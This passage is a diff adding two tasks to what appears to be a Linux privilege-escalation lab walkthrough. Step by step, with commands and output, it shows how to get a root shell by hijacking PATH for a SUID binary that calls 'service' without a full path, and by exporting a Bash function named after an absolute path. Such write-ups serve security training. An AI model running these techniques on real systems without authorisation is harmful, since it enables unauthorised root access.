@@ -540,3 +540,91 @@ Cron jobs are liked scheduled tasks in Windows, they system wide schedule is loc
     root
     bash-4.1# 
     ```
+# Task 13 - SUID / SGID Executables - Environment Variables
+suid-env can be exploited with the user's PATH environment variable
+* Check suid-env
+    ```
+    user@debian:~$ /usr/local/bin/suid-env
+    Starting web server: apache2httpd (pid 1717) already running
+    .
+    ```
+* Check suid-env with strings
+    ```
+    user@debian:~$ strings /usr/local/bin/suid-env
+    /lib64/ld-linux-x86-64.so.2
+    5q;Xq
+    __gmon_start__
+    libc.so.6
+    setresgid
+    setresuid
+    system
+    __libc_start_main
+    GLIBC_2.2.5
+    fff.
+    fffff.
+    l$ L
+    t$(L
+    |$0H
+    service apache2 start
+    ```
+* /usr/local/bin/suid-env runs "service apache2 start" without a full path to the binary, this can be exploited, compile the example code
+    ```
+    user@debian:~$ gcc -o service /home/user/tools/suid/service.c
+    ```
+* Prepend the current directory to the PATH envionrment variable and run suid-env again
+    ```
+    user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
+    root@debian:~# echo $PATH
+    .:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
+
+    root@debian:~# whoami
+    root
+    ```
+# Task 14 - SUID / SGID Executables - Abusing Shell Features
+In Bash versions < 4.2-048 you can create shell functions with names that look like file paths and export those functions so they are used instead of an executable file path
+* Check example with strings
+    ```
+    user@debian:~$ strings /usr/local/bin/suid-env2
+    /lib64/ld-linux-x86-64.so.2
+    __gmon_start__
+    libc.so.6
+    setresgid
+    setresuid
+    system
+    __libc_start_main
+    GLIBC_2.2.5
+    fff.
+    fffff.
+    l$ L
+    t$(L
+    |$0H
+    /usr/sbin/service apache2 start
+    ```
+* Check Bash version
+    ```
+    /usr/sbin/service apache2 start
+    user@debian:~$ /bin/bash --version
+    GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+    Copyright (C) 2009 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+    This is free software; you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.
+    ```
+* Create Bash function with /usr/sbin/service in the name that executes bash and then export it
+    ```
+    user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
+    user@debian:~$ export -f /usr/sbin/service
+    user@debian:~$    
+
+    user@debian:~$ env | tail -3
+    /usr/sbin/service=() {  /bin/bash -p
+    }
+    _=/usr/bin/env    
+    ```
+* Run the example program again
+    ```
+    user@debian:~$ /usr/local/bin/suid-env2
+    root@debian:~# whoami
+    root
+    ```
